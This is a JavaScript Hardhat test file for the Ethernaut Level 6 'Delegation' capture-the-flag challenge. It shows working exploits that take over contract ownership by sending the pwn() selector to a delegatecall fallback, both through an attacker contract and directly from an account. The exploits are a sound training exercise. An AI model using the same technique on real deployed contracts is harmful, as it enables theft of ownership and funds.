// test/ctf/Delegation.test.js
// Exploit test for Ethernaut Level 6 — Delegation

const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("CTF: Ethernaut 6 — Delegation (delegatecall ownership hijack)", () => {
  let delegation, delegate, attacker, deployer, attackerSigner;

  beforeEach(async () => {
    [deployer, attackerSigner] = await ethers.getSigners();

    // Deploy Delegate first
    const Delegate = await ethers.getContractFactory("Delegate");
    delegate = await Delegate.deploy(deployer.address);
    await delegate.waitForDeployment();

    // Deploy Delegation, pointing to Delegate
    const Delegation = await ethers.getContractFactory("Delegation");
    delegation = await Delegation.deploy(await delegate.getAddress());
    await delegation.waitForDeployment();

    // Deploy attacker contract
    const DelegationAttacker = await ethers.getContractFactory("DelegationAttacker");
    attacker = await DelegationAttacker.connect(attackerSigner).deploy();
    await attacker.waitForDeployment();
  });

  it("Delegation owner starts as deployer", async () => {
    expect(await delegation.owner()).to.equal(deployer.address);
  });

  it("EXPLOIT: DelegationAttacker claims ownership via delegatecall fallback", async () => {
    // Pre-exploit: deployer owns Delegation
    expect(await delegation.owner()).to.equal(deployer.address);

    // Execute exploit via attacker contract
    await attacker.connect(attackerSigner).attack(await delegation.getAddress());

    // Post-exploit: attacker contract is now the owner
    expect(await delegation.owner()).to.equal(await attacker.getAddress());
  });

  it("EXPLOIT (EOA): EOA can also claim ownership directly", async () => {
    // Encode pwn() selector
    const pwnSelector = ethers.id("pwn()").slice(0, 10); // 4-byte selector

    // Send tx to Delegation with pwn() calldata
    await attackerSigner.sendTransaction({
      to: await delegation.getAddress(),
      data: pwnSelector,
    });

    expect(await delegation.owner()).to.equal(attackerSigner.address);
  });

  it("REMEDIATION: after exploit, original deployer cannot reclaim without pwn()", async () => {
    await attacker.connect(attackerSigner).attack(await delegation.getAddress());
    // Deployer can try to call pwn() too — but they'd just re-overwrite
    const pwnSelector = ethers.id("pwn()").slice(0, 10);
    await deployer.sendTransaction({
      to: await delegation.getAddress(),
      data: pwnSelector,
    });
    // Now deployer reclaimed (both parties can exploit — no access control)
    expect(await delegation.owner()).to.equal(deployer.address);
  });
});
